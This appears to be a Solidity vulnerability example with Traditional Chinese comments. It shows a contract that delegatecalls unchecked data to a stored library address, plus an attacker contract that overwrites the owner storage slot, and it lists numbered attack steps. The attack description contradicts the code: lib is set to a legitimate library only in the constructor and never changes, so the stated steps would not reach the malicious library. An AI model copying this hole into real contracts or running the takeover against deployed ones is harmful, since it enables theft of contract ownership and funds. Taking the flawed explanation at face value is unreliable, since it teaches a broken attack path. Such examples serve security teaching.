// Vulnerability Code
// 漏洞名稱：Unsafe External Library Call
// 描述：本範例展示因不安全地 delegatecall 到外部 library，導致攻擊者可以透過惡意 library 改變合約的狀態變數(例如 owner)。
// 攻擊流程：
// 1. 攻擊者部署惡意 library（MaliciousLibrary），其 pwn() 函式會利用 delegatecall 將呼叫合約的 owner 變數改成攻擊者地址。
// 2. 攻擊者呼叫 VulnerableContract 的 execute() 函式，傳入對應惡意 library 的函式呼叫資料。
// 3. 由於使用 delegatecall，MaliciousLibrary 的 pwn() 函式在 VulnerableContract 的上下文中執行，從而竄改狀態變數。

pragma solidity >=0.8.0;

// 攻擊者預先部署的惡意 library
contract MaliciousLibrary {
    // 此函式利用 delegatecall 於呼叫合約的儲存槽中覆寫 owner 變數
    function pwn() public {
        // VulnerableContract 的狀態變數排列順序：slot0: lib, slot1: owner, slot2: someValue
        // 因此，我們直接覆寫 slot1 為攻擊者地址（msg.sender）
        assembly {
            sstore(1, caller())
        }
    }
}

contract VulnerableContract {
    // 狀態變數：外部 library 合約的地址，未做有效性檢查
    address public lib; // 漏洞重點：lib 可被指定為任何合約，進而執行 delegatecall
    
    address public owner;
    uint public someValue;
    
    // 初始化時設定外部 library 與 owner
    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }
    
    // 此函式透過 delegatecall 呼叫外部 library 的函式
    // 漏洞重點：未對呼叫的資料及外部合約進行安全檢查
    function execute(bytes memory data) public {
        // 攻擊者可傳入 malicious library 的資料(例如 pwn() 的資料)
        (bool success, ) = lib.delegatecall(data);
        require(success, "Delegatecall failed");
    }
    
    // 接收 Ether 的 fallback 函式
    receive() external payable {}
}

/*
部署與攻擊步驟：
1. 攻擊者先部署 MaliciousLibrary，取得其地址，如：maliciousLibAddress。
2. 部署 VulnerableContract 並將 lib 地址設為合法 library 地址（或是初始預設值）。
3. 攻擊者呼叫 VulnerableContract.execute(abi.encodeWithSignature("pwn()"))，該呼叫會 delegatecall 到 MaliciousLibrary 的 pwn() 函式，進而將 VulnerableContract 的 owner 變數設為攻擊者地址。
*/
